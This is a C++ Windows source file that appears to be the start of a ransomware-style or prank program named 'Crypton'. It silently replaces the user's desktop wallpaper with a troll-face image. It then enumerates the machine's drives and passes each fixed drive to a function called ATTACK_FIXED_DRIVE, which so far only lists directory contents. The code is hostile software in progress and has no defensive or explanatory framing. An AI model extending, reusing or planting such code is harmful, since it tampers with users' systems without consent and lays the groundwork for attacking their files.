#include <windows.h>
#include <bitset>
#include <vector>
#include <iostream>
#include <filesystem>
#include <string>
#include "dirent.h"
#include <direct.h >

using namespace std;

const char* WALL_PAPER_NAME = "troll-face.png"; // name of the new wallpaper hehehe

DWORD drives = 100;
char Buffer[100];
int buff_len; // actual amount of drives on the machine
vector<string> drive_names; // names of the drives


void change_desktop_wallpaper(char* argv[])
{
    
    char basePath[255] = "";
    char* path_ =  _fullpath(basePath, argv[0], sizeof(basePath));

    std::string pathx = std::string(path_);
    std::string delimeter = "\\";


    size_t pos = 0;
    std::string token;
    std::string new_path;

    while ((pos = pathx.find(delimeter)) != string::npos)
    {
        token = pathx.substr(0, pos);
        new_path = new_path + '\\' + token;

        if (token == "Crypton")
        {
            new_path = new_path + '\\' + WALL_PAPER_NAME;
            break;
        }
        
        pathx.erase(0, pos + delimeter.length());
       
    }
 

   
    new_path.erase(0, 1);
    std::cout << new_path << std::endl;
    //conversion of string to wchar_t* because c++ sucks ass
    wstring widestr = wstring(new_path.begin(), new_path.end());
   

    const wchar_t* path = widestr.c_str();
  


    int result;
    result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)path, SPIF_UPDATEINIFILE);
    std::cout << result << endl;
   
}

void ATTACK_FIXED_DRIVE(const char* path)
{

    DIR* dh;
    struct dirent* contents;

    dh = opendir(path);

    if (!dh)
    {
        cout << "The given directory is not found";
        return;
    }
    while ((contents = readdir(dh)) != NULL)
    {
        string name = contents->d_name;
        cout << name << endl;
    }
    closedir(dh);
}

int main(int argc, char* argv[])
{
    change_desktop_wallpaper(argv);
    DWORD test = GetLogicalDriveStrings(drives, (LPWSTR)Buffer);

    for (int i = 0; i < 100; i++) {
        if ((int)Buffer[i] != 0) {

            if (Buffer[i] != ':' && Buffer[i] != '\\') {

                string name="";
                name += Buffer[i];
                name += ":";
                name += '\\';

                drive_names.push_back(name);
                buff_len++;
            }
            
        }
    }

    for (int i = 0; i < buff_len; i++)
    {
        string current_drive = drive_names[i];
       // std::cout << current_drive << endl;
        switch (GetDriveTypeA(current_drive.c_str()))
        {
        case DRIVE_FIXED: ATTACK_FIXED_DRIVE(current_drive.c_str()); break;
        case DRIVE_REMOVABLE: cout << "removable" << endl; break;
        case DRIVE_CDROM: cout << "ROM" << endl; break;
        case DRIVE_REMOTE: cout << "network drive" << endl; break;
        }
    }
    

}